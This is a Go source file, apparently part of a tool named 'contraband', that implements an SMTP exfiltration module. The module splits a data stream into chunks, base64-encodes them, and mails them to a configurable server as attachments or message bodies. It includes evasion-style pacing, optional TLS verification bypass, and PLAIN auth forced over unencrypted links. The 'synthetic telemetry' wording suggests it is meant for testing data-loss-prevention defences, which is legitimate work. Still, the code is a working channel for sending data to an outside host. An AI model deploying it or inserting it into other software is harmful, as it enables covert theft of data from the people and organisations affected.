package mail

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"net/smtp"
	"strconv"
	"strings"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

// SMTPExfiltrator implements mail exfiltration via SMTP / SMTPS / STARTTLS.
// Supports MIME multipart attachments and body embedding modes with X-CTRB-* headers.
type SMTPExfiltrator struct{}

func NewSMTPExfiltrator() *SMTPExfiltrator {
	return &SMTPExfiltrator{}
}

func init() {
	exfil.RegisterExfiltrator(common.ProtoSMTP, NewSMTPExfiltrator())
}

func (e *SMTPExfiltrator) Protocol() string {
	return common.ProtoSMTP
}

type unconstrainedPlainAuth struct {
	identity string
	username string
	password string
}

func (a *unconstrainedPlainAuth) Start(server *smtp.ServerInfo) (string, []byte, error) {
	resp := []byte(a.identity + "\x00" + a.username + "\x00" + a.password)
	return "PLAIN", resp, nil
}

func (a *unconstrainedPlainAuth) Next(fromServer []byte, more bool) ([]byte, error) {
	if more {
		return nil, errors.New("unexpected server challenge in PLAIN auth")
	}
	return nil, nil
}

func (e *SMTPExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	if opts.TotalBytes <= 0 {
		if br, ok := reader.(*bytes.Reader); ok {
			opts.TotalBytes = int64(br.Len())
		} else if bb, ok := reader.(*bytes.Buffer); ok {
			opts.TotalBytes = int64(bb.Len())
		}
	}

	if opts.ExpectedHash == "" {
		if br, ok := reader.(*bytes.Reader); ok {
			cur, _ := br.Seek(0, io.SeekCurrent)
			h := sha256.New()
			_, _ = io.Copy(h, br)
			opts.ExpectedHash = hex.EncodeToString(h.Sum(nil))
			_, _ = br.Seek(cur, io.SeekStart)
		}
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunker, err := evasion.NewStreamChunker(reader, opts.SessionToken, opts.ChunkSize, opts.TotalBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize chunk streamer: %w", err)
	}
	defer chunker.Close()
	result.TargetVolume = opts.TotalBytes

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	isSMTPS := opts.TargetPort == 465 || strings.EqualFold(opts.Headers["smtp_mode"], "smtps")

	tlsCfg := &tls.Config{
		ServerName:         opts.TargetHost,
		InsecureSkipVerify: opts.InsecureTLS,
	}

	dialer := &net.Dialer{
		Timeout: opts.Timeout,
	}

	var rawConn net.Conn
	var client *smtp.Client

	if isSMTPS {
		conn, dialErr := tls.DialWithDialer(dialer, "tcp", targetAddr, tlsCfg)
		if dialErr != nil {
			result.Verdict = classifyError(dialErr)
			result.ErrorMessage = dialErr.Error()
			calculateDurations(&result)
			return &result, dialErr
		}
		rawConn = conn
		result.Timestamps.ConnectedTCP = time.Now().UTC()
		result.Timestamps.HandshakeTLS = time.Now().UTC()

		c, clientErr := smtp.NewClient(conn, opts.TargetHost)
		if clientErr != nil {
			_ = conn.Close()
			result.Verdict = classifyError(clientErr)
			result.ErrorMessage = clientErr.Error()
			calculateDurations(&result)
			return &result, clientErr
		}
		client = c
	} else {
		conn, dialErr := dialer.DialContext(ctx, "tcp", targetAddr)
		if dialErr != nil {
			result.Verdict = classifyError(dialErr)
			result.ErrorMessage = dialErr.Error()
			calculateDurations(&result)
			return &result, dialErr
		}
		rawConn = conn
		result.Timestamps.ConnectedTCP = time.Now().UTC()

		c, clientErr := smtp.NewClient(conn, opts.TargetHost)
		if clientErr != nil {
			_ = conn.Close()
			result.Verdict = classifyError(clientErr)
			result.ErrorMessage = clientErr.Error()
			calculateDurations(&result)
			return &result, clientErr
		}
		client = c

		// Opportunistic or required STARTTLS
		if hasTLS, _ := client.Extension("STARTTLS"); hasTLS {
			if startTLSErr := client.StartTLS(tlsCfg); startTLSErr != nil {
				_ = client.Close()
				result.Verdict = classifyError(startTLSErr)
				result.ErrorMessage = fmt.Sprintf("STARTTLS failed: %v", startTLSErr)
				calculateDurations(&result)
				return &result, startTLSErr
			}
			result.Timestamps.HandshakeTLS = time.Now().UTC()
		}
	}
	defer func() {
		_ = client.Quit()
		_ = rawConn.Close()
	}()

	// Authentication if credentials supplied
	username := opts.Headers["username"]
	password := opts.Headers["password"]
	if username != "" && password != "" {
		auth := &unconstrainedPlainAuth{
			identity: "",
			username: username,
			password: password,
		}
		if authErr := client.Auth(auth); authErr != nil {
			result.Verdict = classifyError(authErr)
			result.ErrorMessage = fmt.Sprintf("SMTP AUTH failed: %v", authErr)
			calculateDurations(&result)
			return &result, authErr
		}
	}

	fromAddr := opts.Headers["from"]
	if fromAddr == "" {
		fromAddr = "agent@contraband.local"
	}
	toAddr := opts.Headers["to"]
	if toAddr == "" {
		toAddr = "drop@contraband.local"
	}

	isBodyMode := strings.EqualFold(opts.Headers["smtp_embed"], "body")

	result.Timestamps.FirstByteSent = time.Now().UTC()

	var headEvidence []byte
	totalChunks := chunker.TotalChunks()

	for {
		chunkFrame, seq, err := chunker.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			result.Verdict = classifyError(err)
			result.ErrorMessage = err.Error()
			calculateDurations(&result)
			return &result, err
		}

		if len(headEvidence) < 768 && len(chunkFrame) > common.ChunkHeaderSize {
			p := chunkFrame[common.ChunkHeaderSize:]
			needed := 768 - len(headEvidence)
			if needed > len(p) {
				needed = len(p)
			}
			headEvidence = append(headEvidence, p[:needed]...)
		}

		if err := client.Mail(fromAddr); err != nil {
			result.Verdict = classifyError(err)
			result.ErrorMessage = fmt.Sprintf("SMTP MAIL FROM failed on chunk %d: %v", seq, err)
			calculateDurations(&result)
			return &result, err
		}

		if err := client.Rcpt(toAddr); err != nil {
			result.Verdict = classifyError(err)
			result.ErrorMessage = fmt.Sprintf("SMTP RCPT TO failed on chunk %d: %v", seq, err)
			calculateDurations(&result)
			return &result, err
		}

		wc, err := client.Data()
		if err != nil {
			result.Verdict = classifyError(err)
			result.ErrorMessage = fmt.Sprintf("SMTP DATA command failed on chunk %d: %v", seq, err)
			calculateDurations(&result)
			return &result, err
		}

		expectedHash := opts.ExpectedHash
		if expectedHash == "" {
			expectedHash = chunker.PayloadHashHex()
		}

		// Craft message
		var msgBuf bytes.Buffer
		msgBuf.WriteString(fmt.Sprintf("From: %s\r\n", fromAddr))
		msgBuf.WriteString(fmt.Sprintf("To: %s\r\n", toAddr))
		msgBuf.WriteString(fmt.Sprintf("Subject: CTRB Telemetry %s %d/%d\r\n", opts.SessionToken.String(), seq, totalChunks))
		msgBuf.WriteString(fmt.Sprintf("X-CTRB-Session-ID: %s\r\n", opts.SessionToken.String()))
		msgBuf.WriteString(fmt.Sprintf("X-CTRB-Sequence: %d\r\n", seq))
		msgBuf.WriteString(fmt.Sprintf("X-CTRB-Total-Chunks: %d\r\n", totalChunks))
		msgBuf.WriteString(fmt.Sprintf("X-CTRB-Payload-Hash: %s\r\n", expectedHash))

		if isBodyMode {
			b64 := wrapBase64Lines(base64.StdEncoding.EncodeToString(chunkFrame), 76)
			msgBuf.WriteString("Content-Type: text/plain; charset=utf-8\r\n")
			msgBuf.WriteString("Content-Transfer-Encoding: base64\r\n\r\n")
			msgBuf.WriteString(b64)
			msgBuf.WriteString("\r\n")
		} else {
			boundary := "----=_ContrabandBoundary_" + opts.SessionToken.String()[:8]
			msgBuf.WriteString(fmt.Sprintf("Content-Type: multipart/mixed; boundary=\"%s\"\r\n\r\n", boundary))

			// Benign part
			msgBuf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
			msgBuf.WriteString("Content-Type: text/plain; charset=utf-8\r\n\r\n")
			msgBuf.WriteString("Contraband synthetic exfiltration telemetry payload.\r\n\r\n")

			// Attachment part
			msgBuf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
			msgBuf.WriteString(fmt.Sprintf("Content-Type: application/octet-stream; name=\"chunk_%d.dat\"\r\n", seq))
			msgBuf.WriteString("Content-Disposition: attachment; filename=\"chunk.dat\"\r\n")
			msgBuf.WriteString("Content-Transfer-Encoding: base64\r\n\r\n")
			b64 := wrapBase64Lines(base64.StdEncoding.EncodeToString(chunkFrame), 76)
			msgBuf.WriteString(b64)
			msgBuf.WriteString(fmt.Sprintf("\r\n--%s--\r\n", boundary))
		}

		rawMsg := msgBuf.Bytes()
		if _, writeErr := wc.Write(rawMsg); writeErr != nil {
			_ = wc.Close()
			result.Verdict = classifyError(writeErr)
			result.ErrorMessage = fmt.Sprintf("SMTP Write failed for chunk %d: %v", seq, writeErr)
			calculateDurations(&result)
			return &result, writeErr
		}

		if closeErr := wc.Close(); closeErr != nil {
			result.Verdict = classifyError(closeErr)
			result.ErrorMessage = fmt.Sprintf("SMTP DATA close failed for chunk %d: %v", seq, closeErr)
			calculateDurations(&result)
			return &result, closeErr
		}

		result.BytesSent += int64(len(rawMsg))

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = classifyError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(headEvidence)
	if result.PayloadHash == "" {
		result.PayloadHash = chunker.PayloadHashHex()
	}

	calculateDurations(&result)
	return &result, nil
}

func calculateDurations(r *common.ProbeResult) {
	if r.Timestamps.TeardownDone.IsZero() {
		r.Timestamps.TeardownDone = time.Now().UTC()
	}
	r.Timestamps.ComputeDurations()
	if r.Timestamps.TransferDuration > 0 && r.BytesSent > 0 {
		r.ThroughputBps = float64(r.BytesSent*8) / (float64(r.Timestamps.TransferDuration) / float64(time.Second)) / 1000.0
	}
}

func classifyError(err error) common.Verdict {
	return common.ClassifyError(err)
}

func wrapBase64Lines(s string, lineLen int) string {
	if lineLen <= 0 {
		lineLen = 76
	}
	if len(s) <= lineLen {
		return s
	}
	var b strings.Builder
	for len(s) > lineLen {
		b.WriteString(s[:lineLen])
		b.WriteString("\r\n")
		s = s[lineLen:]
	}
	if len(s) > 0 {
		b.WriteString(s)
	}
	return b.String()
}
